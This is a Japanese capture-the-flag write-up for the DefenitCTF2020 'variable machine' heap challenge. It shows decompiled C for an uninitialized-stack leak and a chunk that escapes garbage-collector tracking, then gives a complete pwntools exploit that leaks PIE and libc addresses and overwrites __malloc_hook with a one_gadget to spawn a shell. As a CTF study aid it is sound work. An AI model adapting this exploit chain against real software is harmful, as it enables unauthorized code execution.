---
layout: page
title: "[writeup] DefenitCTF2020 / variable machine"
date: 2020-06-22 00:00:00 -0000
---

解法がわからなすぎてwriteupを探したところ見つかったので、理解と整理のためにちゃんと書くことにしました。    
まずはﾄﾞ感謝です。TYVM!!(https://sunrinjuntae.tistory.com/165)
### バイナリ
- メインスレッドと、マークされたチャンクを解放するだけのGCスレッドの2つがあります。
- 命令はすべて独自命令列で記述されて、実行されます。
- 命令は全部で６つあります。ポイントだけ説明します。
    - alloc: int、string、charのタイプを選んでheapチャンクを確保します。確保したheapはすべてGCリストに追加されます。stringだけは更にその下に文字列を格納するチャンクを持ちます。
    - calc: int専用の命令で、+や-を指定することで計算し、結果を格納します。**無効な命令を入れると、未初期化スタックが返ります。**
    - concat: charとstr用の命令で、文字をつなげて新しいチャンクを作成します。**char同士の結合の結果作成されたチャンクは、GCリストに入りません。**

### バグ
上記の２つのバグを詳しく見ていきます。
#### calcの未初期化スタック
```c
ulong r_func5_calc(undefined8 param_1)

{
  int iVar1;
  uint opcode;
  uint v1;
  uint v2;
  ulong local_38;
  ulong local_30;
  uint local_c;
  
  opcode = (uint)((ulong)param_1 >> 0x10) & 0xff;
  v1 = (uint)((ulong)param_1 >> 8) & 0xff;
  v2 = (uint)param_1 & 0xff;
  if (*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) == 0) {
    local_c = 0;
  }
  else {
    if (*(long *)(&register_root_DAT_003030d0 + (long)(int)v2 * 8) == 0) {
      local_c = 0;
    }
    else {
      iVar1 = strcmp(**(char ***)(&register_root_DAT_003030d0 + (long)(int)v1 * 8),"INT");
      if ((iVar1 == 0) &&
         (iVar1 = strcmp(**(char ***)(&register_root_DAT_003030d0 + (long)(int)v2 * 8),"INT"),
         iVar1 == 0)) {
        if (opcode == 1) {
          local_30 = *(long *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8) +
                     *(long *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v2 * 8) + 8);
        }
        else {
          if (opcode == 2) {
            local_30 = *(long *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8) -
                       *(long *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v2 * 8) + 8);
          }
          else {
            if (opcode == 3) {
              local_30 = *(long *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8) *
                         *(long *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v2 * 8) + 8);
            }
            else {
              if (opcode == 4) {
                if (*(long *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v2 * 8) + 8) == 0)
                {
                  local_38 = *(ulong *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) +
                                       8);
                }
                else {
                  local_38 = *(ulong *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) +
                                       8) /
                             *(ulong *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v2 * 8) +
                                       8);
                }
                local_30 = local_38;
              }
            }
          }
        }
        *(ulong *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8) = local_30;
        local_c = 1;
      }
      else {
        local_c = 0;
      }
    }
  }
  return (ulong)local_c;
  ```
各計算の結果が`local_38`に入り、`local_30`に代入され、それが１つ目のチャンクに入ります。`opcode`が4より大きいときには、`local_38`は一度も触られることなく利用されるため、スタックがリークするという仕組みです。値はpie絡みのものになっているため、オフセットを計算するとpieベースが特定できます。

#### GCリスト管理外チャンク
concatのコードは以下のとおりです。
```c
ulong r_func6_concat(undefined8 param_1)
{
  undefined8 *puVar1;
  undefined8 *puVar2;
  int iVar3;
  uint uVar4;
  undefined8 uVar5;
  size_t sVar6;
  char *__s;
  char local_29 [3];
  char local_26;
  char local_25;
  uint v2;
  uint v1;
  uint cmd;
  undefined8 local_18;
  uint local_c;
  
  cmd = (uint)((ulong)param_1 >> 0x10) & 0xff;
  v1 = (uint)((ulong)param_1 >> 8) & 0xff;
  v2 = (uint)param_1 & 0xff;
  if (*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) == 0) {
    local_c = 0;
    goto LAB_001018a0;
  }
  if (*(long *)(&register_root_DAT_003030d0 + (long)(int)v2 * 8) == 0) {
    local_c = 0;
    goto LAB_001018a0;
  }
  local_18 = param_1;
  if (cmd == 1) {
    iVar3 = strcmp(**(char ***)(&register_root_DAT_003030d0 + (long)(int)v1 * 8),"CHAR");
    if (iVar3 == 0) {
      iVar3 = strcmp(**(char ***)(&register_root_DAT_003030d0 + (long)(int)v2 * 8),"CHAR");
      if (iVar3 == 0) {
        local_25 = *(char *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8);
        local_26 = *(char *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v2 * 8) + 8);
        snprintf(local_29,3,"%c%c",(ulong)(uint)(int)local_25,(ulong)(uint)(int)local_26);
        **(undefined8 **)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) = 0x101e40;
        uVar5 = r_create_buffer(1,0x10);
        *(undefined8 *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8) = uVar5;
        sVar6 = strlen(local_29);
        *(size_t *)(*(long *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8) + 8) =
             sVar6;
        __s = strdup(local_29);
        **(char ***)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8) = __s;
LAB_00101899:
        local_c = 1;
        goto LAB_001018a0;
      }
    }
    local_c = 0;
  }
  else {
    if (cmd != 2) {
      local_c = 0;
      goto LAB_001018a0;
    }
    iVar3 = strcmp(**(char ***)(&register_root_DAT_003030d0 + (long)(int)v1 * 8),"STRING");
    if (iVar3 == 0) {
      iVar3 = strcmp(**(char ***)(&register_root_DAT_003030d0 + (long)(int)v2 * 8),"STRING");
      if (iVar3 == 0) {
        puVar1 = *(undefined8 **)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8);
        puVar2 = *(undefined8 **)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v2 * 8) + 8);
        uVar4 = (int)puVar1[1] + (int)puVar2[1] + 1;
        __s = (char *)r_create_buffer((ulong)uVar4,1,(ulong)uVar4);
        snprintf(__s,puVar1[1] + puVar2[1] + 1,"%s%s",*puVar1,*puVar2);
        r_move_to_garbage(**(undefined8 **)
                            (*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8));
        sVar6 = strlen(__s);
        *(size_t *)(*(long *)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8) + 8) =
             sVar6;
        **(char ***)(*(long *)(&register_root_DAT_003030d0 + (long)(int)v1 * 8) + 8) = __s;
        goto LAB_00101899;
      }
    }
    local_c = 0;
  }
LAB_001018a0:
  return (ulong)local_c;
}
```
だいたい上半分が、型がcharだったとき、下がstrのときになります。`r_create_buffer`は作ったチャンクをGCリストに追加する操作をしますが、charの結合では最後に`strdup`でチャンクを作っていることがポイントです。これによってGCリストに繋がれないチャンクが生成されます。1回呼ばれているのでちゃんと処理されているように見えますが、管理チャンクが追加されただけで、stringの格納先は野放しです。（これで引っかかって解けなかった。）

格納先のチャンクがGCリストに存在しないとどうなるでしょうか。

strのconcatにおいては、古いチャンクは管理フラグをクリアされますが、このとき該当するチャンクを探すために`r_find_chunk_from_gc_list`を利用します。コードは以下のとおりです。
```c
long * r_find_chunk_from_gc_list(long param_1)
{
  long *local_20;
  
  local_20 = chunk_list_DAT_003038d0;
  while ((local_20[2] != 0 && (*local_20 != param_1))) {
    local_20 = (long *)local_20[2];
  }
  return local_20;
}
```
該当アドレスを格納したチャンクか、次のチャンクがなくなるまでたぐって行って、どちらかの条件を満たすチャンクを返します。このとき、GCリストにないチャンクの削除を指示した場合はどのチャンクにも該当しないため、GCリストの一番うしろを返します。つまり、最新のチャンクです。

これらのバグをまとめると、char同士のconcatで生まれたチャンクはGCリストに管理されないため、このチャンクを削除しようとすると、代わりに最新のチャンクがfreeされます。あとはfreeされたチャンクを編集することでオーバーラップすることで任意書き込みが出来上がります。あとはチャンクを重ねて管理ポインタを書き換えリークし、再び書き換えて`__malloc_hook`に書き込みします。gotを変えても良いです。

スクリプトを読む上での実装上のポイントは４つあります。
1. freeは別スレッドで動くので、入力が早すぎるとfreeが走る前にexploitが進んでしまい、上手く攻撃できません。concatの処理に進むところでpause()を入れて対応します。（ただ、成功率が1/16なので自動化すべきです。）
2. ダングリングになるチャンクは、もとのポインタの近くに作れないので、1/16でheapを当てることになります。（このexploitではheap+0x2710を狙っています。）
3. チャンクを編集する上で、GCリストにぶら下がるチャンクを編集することになるので、freeされないように作成する必要があります。
4. `stdout`をリークするとき、`__malloc_hook`を改ざんするときは、そこを直接指定するのではなく”そこを指すポインタ”を指す必要があります。

データ構造の補足です。まずメインのリストから。

![main list](/assets/variable_machine/01.png)

char,intはそのまま値が、stringのみポインタを持ちます。

つぎにGCのリストがこちら。

![GC list](/assets/variable_machine/02.png)

+8にフラグを持ちながら、ゼロならそのチャンクをfreeにして非ゼロにします。GCスレッドは永久にこのリストをたぐり続けてフラグを見て処理を行い、次のチャンクが0になるとまた最初からfreeします。

上記２つの構造を頭に入れながら、オーバーラップ後のチャンクの方針です。

![structure](/assets/variable_machine/03.png)

ポイントは0xdeadbeef（非ゼロであればOK）と１、その次の０が偽GCチャンクになっていて、これでGCスレッドを止めずに攻撃を進めることができます。stdoutへのポインタの部分を変更することで、チャンク１２を編集すればそのアドレスに書き込むことができるという仕組みです。

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './main'
HOST = 'localhost'
PORT = 5333

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def alloc(idx, t, value):
    payload = ''
    payload += '\x01'
    payload += chr(idx)
    if t == 'int':
        payload += '\x00'
    elif t == 'str':
        payload += '\x01'
    elif t == 'char':
        payload += '\x02'
    else:
        payload += t
        
    payload += chr(value)
    return payload 

def delete(idx):
    payload = ''
    payload += '\x02'
    payload += chr(idx)
    return payload 

def edit(idx, value):
    payload = ''
    payload += '\x03'
    payload += chr(idx)
    payload += chr(value)
    return payload 

def show(idx):
    payload = ''
    payload += '\x04'
    payload += chr(idx)
    return payload 

def calc(t, v0, v1):
    payload = ''
    payload += '\x05'
    if t == '+':
        payload += '\x01'
    elif t == '-':
        payload += '\x02'
    elif t == '*':
        payload += '\x03'
    elif t == '/':
        payload += '\x04'
    else:
        payload += t
    payload += chr(v0)
    payload += chr(v1)
    return payload 

def concat(operator, v0, v1):
    payload = ''
    payload += '\x06'
    payload += chr(operator)
    payload += chr(v0)
    payload += chr(v1)
    return payload 

r = start()
payload = ''

# leak pie with uninitialized stack + invalid opration in func_calc 
payload += alloc(0, 'int', 0)
payload += alloc(1, 'int', 0)
payload += calc('\x7f', 0, 1) 
payload += show(0) 

# create overlap chunk with dangling 
payload += alloc(5, 'char', 0x61)
payload += alloc(6, 'char', 0x62)
payload += alloc(7, 'str', 0x40)

payload += alloc(8, 'char', 0x63)
payload += alloc(9, 'char', 0x64)
payload += alloc(10, 'str', 0x40)
payload += edit(7, 0x40)
payload += edit(10, 0x40)
payload += concat(1, 5, 6)
payload += concat(1, 8, 9)
payload += concat(2, 5, 7)
payload += concat(2, 8, 10)
payload += alloc(11, 'str', 0x60)
payload += alloc(12, 'str', 0x60)
payload += edit(11, 0x60)
payload += edit(8, 2) # 1/16

# leak libc from pointer to stdout
payload += alloc(13, 'str', 0x40)
payload += alloc(14, 'str', 0x40) # this chunk will point overlap chunk
payload += edit(14, 0x40) # point bss
payload += show(12) # leak stdout

# overwrite malloc hook
payload += edit(14, 0x40) # point mh
payload += edit(12, 0x8)
payload += alloc(15, 'str', 0x40)

r.sendlineafter(':> ', payload)

# --------
r.recvuntil('--')
r.recvuntil('INT 0 : ')
leak = int(r.recvuntil(']')[:-1])
dbg('leak')
pie = leak - 0xe32
dbg('pie')
r.send('!'*0x40)
r.send('@'*0x40)
pause()
r.send('X'*0x58+p64(0x51))
if args.D:
    # debug(r, [0x11ec, 0x1342, 0x1840, 0x1880, 0x1baf, 0x1d97])
    debug(r, [0x11ec, 0x1bc4, 0x1d97])
r.send('\x10\xa7')

r.send(flat(0, 0, 0xdeadbeef, 1, 0, 0) +p64(pie+0x1e40)+p64(pie+0x202fd0))
r.recvuntil('[STRING 12 : ')
leak = u64(r.recvuntil(']')[:-1]+'\x00'*2)
dbg('leak')
base = leak - 0x3c5620
dbg('base')
ptr_mh = base + 0x3c3ef0 # ptr points to malloc hook

gadget = [
    0x45216, # execve("/bin/sh", rsp+0x30, environ)
    0x4526a, # execve("/bin/sh", rsp+0x30, environ)
    0xf02a4, # execve("/bin/sh", rsp+0x50, environ)
    0xf1147  # execve("/bin/sh", rsp+0x70, environ)
]
r.send(flat(0, 0, 0xdeadbeef, 1, 0, 0) +p64(pie+0x1e40)+p64(ptr_mh))
r.send(p64(base + gadget[3]))

r.interactive()
r.close()
```